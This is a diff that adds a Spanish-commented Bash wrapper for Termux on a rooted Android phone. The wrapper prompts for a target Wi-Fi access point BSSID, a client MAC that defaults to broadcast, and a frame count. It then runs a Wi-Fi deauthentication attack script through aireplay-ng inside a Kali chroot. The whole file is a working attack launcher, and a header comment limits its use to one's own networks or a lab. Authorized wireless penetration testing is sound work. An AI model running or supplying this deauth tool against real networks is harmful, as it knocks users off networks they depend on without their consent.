@@ -1,0 +1,22 @@
+#!/data/data/com.termux/files/usr/bin/bash
+# Puente Termux -> chroot Kali. Requiere root (Magisk autoriza Termux).
+# Deauth dirigido/masivo con aireplay-ng. Pide el objetivo por teclado.
+# USO AUTORIZADO UNICAMENTE: redes propias / lab.
+KALI="/data/local/nhsystem/kali-arm64"
+PATHK="export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+PROJ="cd /root/watchdog-git"
+
+echo "== DEAUTH WIFI =="
+echo "Antena externa en modo monitor requerida (WD-MONITOR)."
+echo
+read -p "BSSID del AP objetivo (AA:BB:CC:DD:EE:FF): " BSSID
+if [ -z "$BSSID" ]; then echo "[X] Sin BSSID. Cancelado."; echo "[enter]"; read; exit 1; fi
+read -p "Cliente (enter = broadcast FF:FF:FF:FF:FF:FF): " CLIENT
+[ -z "$CLIENT" ] && CLIENT="FF:FF:FF:FF:FF:FF"
+read -p "Cantidad de tramas [20]: " COUNT
+[ -z "$COUNT" ] && COUNT="20"
+
+echo
+echo "Lanzando deauth -> AP $BSSID | cliente $CLIENT | $COUNT tramas"
+su -c "chroot $KALI /bin/bash -c '$PATHK; $PROJ && bash scripts/kali-scripts/wifi_deauth.sh \"$BSSID\" \"$CLIENT\" \"$COUNT\"'"
+echo; echo "[enter para cerrar]"; read
